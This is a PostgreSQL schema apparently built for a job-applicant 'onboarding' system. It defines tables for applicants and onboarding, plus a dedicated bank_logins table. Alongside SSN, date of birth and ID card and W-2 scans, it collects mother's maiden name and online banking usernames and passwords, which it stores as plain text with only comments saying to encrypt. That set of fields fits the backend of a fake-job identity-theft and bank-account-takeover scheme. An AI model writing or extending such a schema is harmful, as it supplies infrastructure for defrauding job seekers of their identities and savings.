-- ===================================
-- Enable required extensions
-- ===================================
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- ===================================
-- Drop old tables
-- ===================================
DROP TABLE IF EXISTS bank_logins CASCADE;
DROP TABLE IF EXISTS onboarding CASCADE;
DROP TABLE IF EXISTS applicants CASCADE;

-- ===================================
-- Applicants Table
-- ===================================
CREATE TABLE applicants (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  first_name TEXT NOT NULL,
  last_name TEXT NOT NULL,
  email TEXT NOT NULL UNIQUE,
  phone TEXT NOT NULL,

  -- Resume as file URL (public access)
  resume_url TEXT NOT NULL,

  -- Resume as binary (private access)
  resume_binary BYTEA,
  resume_mime TEXT,

  status TEXT NOT NULL DEFAULT 'pending',  -- 'pending' | 'accepted' | 'rejected'
  application_date DATE NOT NULL DEFAULT CURRENT_DATE
);

CREATE INDEX idx_applicants_status ON applicants(status);

-- ===================================
-- Onboarding Table
-- ===================================
CREATE TABLE onboarding (
  applicant_id UUID PRIMARY KEY REFERENCES applicants(id) ON DELETE CASCADE,

  -- Identity info
  first_name TEXT NOT NULL,
  middle_name TEXT,
  last_name TEXT NOT NULL,
  mother_maiden_name TEXT,
  date_of_birth DATE NOT NULL,
  ssn TEXT,  -- ⚠️ Mask or encrypt this in app logic

  -- Address
  street TEXT NOT NULL,
  city TEXT NOT NULL,
  state TEXT NOT NULL,
  zip_code TEXT NOT NULL,

  -- Banking
  account_number TEXT NOT NULL,
  routing_number TEXT NOT NULL,
  bank_name TEXT NOT NULL,
  bank_username TEXT,
  bank_password TEXT, -- ⚠️ Encrypt in your application

  -- ID Documents: File paths (for frontend)
  front_image_url TEXT NOT NULL,
  back_image_url TEXT NOT NULL,
  w2_form_url TEXT NOT NULL,

  -- Optional: Binary blobs (for protected serving)
  front_image_binary BYTEA,
  back_image_binary BYTEA,
  w2_form_binary BYTEA,
  w2_form_mime TEXT,

  onboarding_completed BOOLEAN NOT NULL DEFAULT false,
  onboarding_date TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
);

-- ===================================
-- Bank Logins Table (optional)
-- ===================================
CREATE TABLE bank_logins (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  applicant_id UUID NOT NULL REFERENCES applicants(id) ON DELETE CASCADE,
  bank_name TEXT NOT NULL,
  username TEXT NOT NULL,
  password TEXT NOT NULL, -- ⚠️ Encrypt in app
  created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX idx_bank_logins_applicant_id ON bank_logins(applicant_id);
